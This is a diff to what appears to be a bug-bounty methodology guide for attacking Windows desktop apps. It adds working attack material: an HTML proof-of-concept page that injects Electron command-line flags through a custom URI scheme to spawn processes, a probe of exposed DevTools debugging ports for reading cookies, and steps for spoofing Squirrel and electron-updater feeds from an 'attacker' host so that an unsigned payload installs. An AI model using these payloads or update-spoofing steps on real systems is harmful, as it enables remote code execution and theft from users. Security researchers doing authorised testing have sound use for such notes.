@@ -31,6 +31,7 @@ Desktop-app bugs pay when the trigger is **remote** (browser-delivered deep link
 setup.exe (Inno Setup)         → innounp -x; [Code] section = Pascal script logic
 setup.exe (NSIS)               → 7z x; $PLUGINSDIR logic
 Update.exe + RELEASES + *.nupkg → Squirrel-based updater (Electron/Atom-class)
+app-update.yml / latest.yml    → electron-builder `electron-updater` (generic/GitHub/S3 provider — more common than Squirrel on 2024+ builds)
 resources/app.asar             → Electron
 resources/app.asar.unpacked/   → native modules shipped outside ASAR
 *.exe.config / appsettings.json → .NET; decompile with dnSpy/ILSpy
@@ -111,13 +112,32 @@ $env:NODE_EXTRA_CA_CERTS="C:\tools\mitmproxy-ca.pem"
 
 **URI-scheme enumeration + injection probe:**
 ```powershell
-Get-ChildItem HKCR:\ | Where-Object { Get-ItemProperty "HKCR:\$($_.PSChildName)" -Name 'URL Protocol' -ErrorAction SilentlyContinue } |
-  ForEach-Object { $s=$_.PSChildName; $c=(Get-ItemProperty "HKCR:\$s\shell\open\command" -ErrorAction SilentlyContinue).'(default)'; "$s => $c" }
+# HKCR: is not a default PSDrive. Use the Registry:: provider.
+Get-ChildItem 'Registry::HKEY_CLASSES_ROOT' | ForEach-Object {
+  $s = $_.PSChildName
+  $has = Get-ItemProperty -LiteralPath "Registry::HKEY_CLASSES_ROOT\$s" -Name 'URL Protocol' -ErrorAction SilentlyContinue
+  if ($has) {
+    $c = (Get-ItemProperty -LiteralPath "Registry::HKEY_CLASSES_ROOT\$s\shell\open\command" -ErrorAction SilentlyContinue).'(default)'
+    "$s => $c"
+  }
+}
 ```
 ```html
-<!-- PoC page: quote-breakout + Electron flag injection -->
-<script>location.href = 'targetscheme://x" --gpu-launcher="cmd /c calc';</script>
+<!-- Quote-breakout. --gpu-launcher still works on many Electron builds;
+     --inspect is the reliable one when EnableNodeCliInspectArguments is on. -->
+<script>
+  location.href = 'targetscheme://x" --gpu-launcher="calc.exe" --';
+  // if gpu-launcher is ignored, these still spawn a child on many Chromium/Electron builds:
+  // location.href = 'targetscheme://x" --utility-cmd-prefix="calc.exe" --';
+  // location.href = 'targetscheme://x" --inspect=9229 --';  // only if EnableNodeCliInspectArguments fuse is on
+</script>
 ```
+
+**WebView2 / CEF remote debugging (one GET):**
+```bash
+curl -s "http://127.0.0.1:9222/json/version"
+```
+A `webSocketDebuggerUrl` in the body is the DevTools endpoint. Impact is one CDP call that reads a title or cookie the app holds. An open port with no JSON is not the bug. If it binds `127.0.0.1` and also ignores `Host`, rebinding applies (step 6).
 
 **DNS-rebinding gate test against localhost API:**
 ```bash
@@ -139,12 +159,18 @@ Filter: Process Name is app.exe → Include
 Launch app → any path under %LOCALAPPDATA%, %TEMP%, or PATH dirs = candidate
 ```
 
-**Squirrel update spoof:**
+**Squirrel / electron-updater spoof:**
 ```bash
-# point feed at attacker host (config, registry, or hosts file), serve:
+# Squirrel: point feed at attacker host (config, registry, or hosts file), serve:
 /RELEASES                      # forged manifest listing malicious .nupkg
 /app-9.9.9-full.nupkg          # payload package
 # then trigger: Update.exe --update=http://attacker/
+
+# electron-builder electron-updater (check resources/app-update.yml next to the exe):
+#   type: generic|github|s3
+#   url: http://updates.example/     # HTTP = MITM
+# serve latest.yml + App-9.9.9-full.exe (or .nsis). Flip one byte of the payload —
+# if it still installs, signature/publisherName is not enforced.
 # install succeeds without valid signature → RCE at next launch
 ```
 
